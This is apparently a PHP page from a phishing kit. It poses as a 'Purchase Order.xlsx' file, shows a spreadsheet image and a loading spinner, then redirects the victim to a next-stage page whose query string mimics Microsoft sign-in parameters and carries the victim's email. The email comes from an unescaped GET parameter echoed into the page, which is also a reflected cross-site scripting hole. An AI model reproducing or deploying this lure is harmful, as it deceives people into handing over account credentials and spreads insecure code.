<?php


$gang = $_GET['gang'];

echo "<meta http-equiv=refresh content=5;url='of1?email=$gang&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1' >";


?>

<html>

<head>
<title> Purchase Order.xlsx </title>


<STYLE>
    body {
    background: url(xls.png) no-repeat;
    background-image: url(xls.png);
    background-position-x: initial;
    background-position-y: initial;
    background-size: cover;
    background-repeat-x: no-repeat;
    background-repeat-y: no-repeat;
    background-attachment: initial;
    background-origin: initial;
    background-clip: initial;
    background-color: initial;
    background-size: cover;
    position: absolute;
    width: 100%;
    height: 100%;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    overflow: hidden;
    font-family: 'PT Sans', sans-serif;
}
</STYLE>


</head>

<body>


<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; id="layer1">
<img src="loading.gif">
</div>

</body>
</html>
